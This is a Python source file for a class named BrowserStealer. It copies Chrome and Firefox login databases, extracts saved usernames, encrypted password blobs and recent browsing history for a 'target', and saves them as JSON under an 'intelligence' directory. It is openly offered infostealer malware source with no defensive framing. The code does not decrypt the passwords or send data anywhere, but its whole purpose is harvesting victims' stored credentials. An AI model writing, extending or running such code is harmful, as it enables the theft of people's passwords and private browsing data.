import os
import json
import logging
import sqlite3
import shutil
from datetime import datetime

logger = logging.getLogger(__name__)

class BrowserStealer:
    def __init__(self, storage_dir="/intelligence/extracted_data/"):
        self.storage_dir = storage_dir
        os.makedirs(self.storage_dir, exist_ok=True)

    def process_chrome_data(self, target_id, db_path):
        """Extract saved passwords and history from Chrome/Chromium login data."""
        if not os.path.exists(db_path):
            logger.error(f"DB not found: {db_path}")
            return None
        temp_db = f"/tmp/chrome_{target_id}.db"
        shutil.copy2(db_path, temp_db)
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            # Extract logins
            logins = []
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                logins.append({
                    "url": row[0],
                    "username": row[1],
                    "password": row[2].hex()  # encrypted blob, may need decryption
                })
            # Extract history
            history = []
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            for row in cursor.fetchall():
                history.append({"url": row[0], "title": row[1], "last_visit": row[2]})
            conn.close()
            return {"logins": logins, "history": history}
        except Exception as e:
            logger.error(f"Chrome extraction error: {e}")
            return None
        finally:
            os.remove(temp_db)

    def process_firefox_data(self, target_id, profile_path):
        """Extract logins from Firefox signons.sqlite."""
        db_path = os.path.join(profile_path, "signons.sqlite")
        if not os.path.exists(db_path):
            logger.error(f"Firefox signons not found: {db_path}")
            return None
        temp_db = f"/tmp/firefox_{target_id}.db"
        shutil.copy2(db_path, temp_db)
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            logins = []
            cursor.execute("SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins")
            for row in cursor.fetchall():
                logins.append({
                    "hostname": row[0],
                    "username": row[1].hex(),
                    "password": row[2].hex()
                })
            conn.close()
            return {"logins": logins}
        except Exception as e:
            logger.error(f"Firefox extraction error: {e}")
            return None
        finally:
            os.remove(temp_db)

    def save_extracted(self, target_id, data, source="browser"):
        """Save extracted data to a JSON file."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{target_id}_{source}_{timestamp}.json"
        filepath = os.path.join(self.storage_dir, filename)
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        logger.info(f"Saved browser data to {filepath}")
        return filepath